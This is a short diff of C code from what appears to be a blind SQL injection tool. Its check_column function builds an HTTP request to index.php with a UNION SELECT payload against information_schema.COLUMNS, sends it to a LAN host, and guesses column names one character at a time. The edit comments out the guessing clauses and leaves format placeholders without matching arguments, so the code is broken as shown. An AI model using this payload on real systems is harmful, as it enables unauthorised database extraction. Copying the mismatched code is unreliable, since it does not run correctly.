@@ -259,16 +259,16 @@ bool check_column(const void *ctx) {
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
         "FROM%%20information_schema.COLUMNS%%20"
         "WHERE%%20table_name%%3d%%27%s%%27%%20" // %s = table_name (Literal! Must use %27 single quotes)
-        "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find (Literal)
-        "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
-        "AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
+        // "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find (Literal)
+        // "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
+        // "AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n";
 
-    sprintf(mal_req, fmt, "usrtABLE", c_ctx->col_to_find, c_ctx->gen_ctx.discovered, c_ctx->gen_ctx.index + 1, c_ctx->gen_ctx.guess);
+    sprintf(mal_req, fmt, "usrtABLE");
     _send(c_ctx->gen_ctx.sockfd, mal_req, strlen(mal_req));
     return recv_empty(c_ctx->gen_ctx.sockfd);
 }
